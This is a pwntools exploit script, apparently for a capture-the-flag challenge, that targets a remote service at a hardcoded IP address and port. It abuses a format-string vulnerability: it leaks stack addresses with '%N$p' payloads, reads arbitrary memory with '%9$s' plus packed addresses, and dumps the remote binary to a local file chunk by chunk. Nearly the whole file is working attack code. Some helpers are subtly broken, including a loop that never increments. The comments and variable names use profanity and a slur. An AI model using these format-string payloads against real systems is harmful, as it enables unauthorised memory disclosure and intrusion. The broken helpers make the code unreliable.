from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "/bin/bash"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b main
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    pp = remote("5.161.93.250", 42069)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

################ notes ################################
# fucking 34 contains the fucking elf binary


def read_strtab(base_addr):
    ###### some constatns 
    e_shof_offset = 3736

    i = 0;
    pp.recvuntil(b">\n")
    for i in range(16):
        sh = read_bytes(base_addr + e_shof_offset, 64)
        log.info("finding the strshit")
        print(sh)
        print(hex(u64(sh[8:16])))
        e_shof_offset += 64
        # if (p32(sh[4:8]) == 3):
        #     print(sh[24 : (24 + 8)])



# base :0x7ffe76761000
def leak():
    #offset = 
    log.info("binary loaded")
    # 94, 110
    i = 30
    while (i < 200):
        if (i == 56):
            i += 1
        try :
            pp.recvuntil(b">")
            pp.sendline(f"%{i}$p p".encode())
            leak = pp.recvuntil(b" p").replace(b" p", b"")
            print(f"{leak} [{i}]");
            if (b"7f" in leak or b"55" in leak):
                pp.recvuntil(b">")
                pp.sendline(f"%{i}$s x".encode())
                leak = pp.recvuntil(b" x").replace(b" x", b"")
                print(f"-------->{leak} {i}");
            i += 1
        except:
            i+=1

            
    pp.interactive()

def basex(ppx):
    elfbase = 110
    log.info("leaking the base address")
    ppx.recvuntil(b">")
    ppx.sendline(f"%{elfbase}$p+".encode())
    ppx.recvline()
    elf.base = int(ppx.recvline().rstrip().replace(b"+", b""), 16)
    return (elf.base)

def skip_junk(ppx, basex):
    ppx.sendline(b"%9$s\x00\x00\x00\x00" + p64(basex))
    bytesx = ppx.recvuntil(b"ECHO >\n").replace(b"ECHO >\n", b"")

def read_bytes(ppx, base_addr, size):
    bytesdzebi = b""
    i = 1
    # file = open("mrbeasty.bin", "wb")

    skip_junk(ppx, base_addr)
    while (i < size):
        try :
            ppx.sendline(b"%9$s\x00\x00\x00\x00" + p64(base_addr + i))
            bytesx = ppx.recvuntil(b"ECHO >\n").replace(b"ECHO >\n", b"")
            if (bytesx == b""):
                bytesx = b"\x00"
            bytesdzebi += bytesx[0:1]
            i += 1
        except:
            log.warn(f"byte {i} is unreadable")
            ppx = init()
            ppx.recvuntil(b">")
            ppx.sendline(f"%34$p+".encode())
            ppx.recvline()
            base_addr = int(ppx.recvline().rstrip().replace(b"+", b""), 16)
            # i += 0
            size += 1

    print(bytesdzebi)
    return (bytesdzebi)

def most_frequent(List):
    counter = 0
    num = List[0]
     
    for i in List:
        curr_frequency = List.count(i)
        if(curr_frequency> counter):
            counter = curr_frequency
            num = i
    return num

def get_legit_chunk(offset):
    memes = []
    i = 0
    log.info("getting legit chunk")
    while (i < 10):
        ppx = init()
        base = basex(ppx) 
        zeb = read_bytes(ppx, base + offset, 64)
        memes += zeb
        ppx.close()
    return (most_frequent(memes))

        

def exploit():
    retard = b""
    file = open("liblmjnouna.bin", "wb", buffering=0)
    offset = 0
    for i in range(2000):
        log.info(f"reading chunk {i}")
        for x in range(2):
            ppx = init()
            base = basex(ppx) 
            zeb = read_bytes(ppx, base + offset, 64)
            if (x == 0):
                retard = zeb
            elif (zeb == retard):
                log.info(f"chunk {x} valid")
            else :
                retard = get_legit_chunk(offset)
            ppx.close()
        file.write(retard)
        offset += 64
    # read_strtab(elf.base)
    
    

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
# leak()
